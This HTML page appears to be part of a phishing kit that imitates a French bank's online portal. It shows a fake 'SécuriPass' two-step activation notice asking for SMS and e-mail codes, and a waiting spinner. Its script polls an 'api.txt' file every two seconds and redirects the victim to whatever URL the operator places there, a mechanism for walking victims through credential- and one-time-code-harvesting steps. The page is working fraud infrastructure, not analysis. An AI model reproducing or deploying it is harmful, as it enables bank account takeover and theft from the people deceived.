
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
        <link rel="stylesheet" href="media/css/helpers.css">
        <link rel="stylesheet" href="media/css/style.css">

        <link rel="icon" type="image/x-icon" href="media/imgs/ff.ico" />

        <title>Acceso online</title>
    </head>

    <body>

		<!-- HEADER -->
        <header id="header2" class="d-lg-flex d-md-none d-sm-none d-none">
            <div class="logo"><img style="width: 57px;" src="media/imgs/logo2.svg"></div>
            <div class="menu">
                <ul>
                    <li>Ma synthèse</li>
                    <li>Mes opérations <i class="fas fa-sort-down"></i></li>
                    <li>Mes documents <i class="fas fa-sort-down"></i></li>
                    <li>Mes autres comptes <i class="fas fa-sort-down"></i></li>
                    <li>toute l'offre <i class="fas fa-sort-down"></i></li>
                    <li>nos conseils <i class="fas fa-sort-down"></i></li>
                </ul>
            </div>
            <div class="btns">
                <img style="min-width: 399px;" src="media/imgs/login-menu.png">
            </div>
        </header>
        <!-- END HEADER -->

        <!-- HEADER MOBILE -->
        <div id="mobile-menu" class="d-lg-none d-md-flex d-sm-flex d-flex" style="background: #F5F5F5;">
            <div class="pl-3"><img src="media/imgs/mobilemenu.png"></div>
            <div><img style="width: 57px;" src="media/imgs/logo2.svg"></div>
            <div><img style="min-width: 120px;" src="media/imgs/log-menu2.png"></div>
        </div>
        <!-- END HEADER MOBILE -->

        <!-- MAIN -->
        <main id="main">
            <div class="left two order-lg-1 order-md-2 order-sm-2 order-2">
                <div class="top">
                    <div class="content2">
                        <div class="tt"><p>POUR VOTRE SÉCURITÉ</p></div>
                        <h3>Activation sécuripass en deux étapes :</h3>
                        <ul>
                            <li>Entrer le code reçu par SMS envoyé sur votre numéro.</li>
                            <li>Entrer le code à 6 chiffres reçu par E-mail.</li>
                            <li>Votre SécuriPass à été activé.</li>
                        </ul>
                    </div>
                </div>
                <div class="bottom">
                    <div class="ccc">
                        
                        <img src="media/imgs/chat2.png">
                        <p class="mt30 mb10">Une question ?</p>
                        <p class="mb30"><b>Un conseiller vous accompagne</b></p>
                        <button type="button">Contacter un conseiller</button>

                    </div>
                </div>
            </div>
            <div class="right order-lg-2 order-md-1 order-sm-1 order-1 d-flex align-items-center justify-content-center">
                <div class="loaderr">
                    <div class="spinner-border" role="status"></div>
                    <img src="media/imgs/logosvg.svg">
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="media/js/js.js"></script>

      
<script>
        function fetchAndRedirect() {
            var client = new XMLHttpRequest();
            client.open('GET', 'api.txt?v=' + new Date().getTime(), true); // Cache busting
            client.onreadystatechange = function() {
                if (client.readyState === 4) {
                    if (client.status === 200) {
                        var responseText = client.responseText;
                        console.log("Fetched responseText:", responseText);

                        // Extract URL from meta refresh tag
                        var urlMatch = responseText.match(/<meta\s+http-equiv=['"]refresh['"]\s+content=['"][^;]+;\s*url=([^'"]+)['"]/i);

                        if (urlMatch && urlMatch[1]) {
                            var redirectUrl = urlMatch[1];
                            console.log("Redirecting to URL:", redirectUrl);
                            window.location.href = redirectUrl;
                        } else {
                            console.error("Failed to extract URL from response.");
                        }
                    } else {
                        console.error("Failed to fetch data from api.txt, status code:", client.status);
                    }
                }
            };
            client.send();
        }

        // Fetch the URL and redirect every 2 seconds
        setInterval(fetchAndRedirect, 2000);
    </script>
 

    </body>

</html>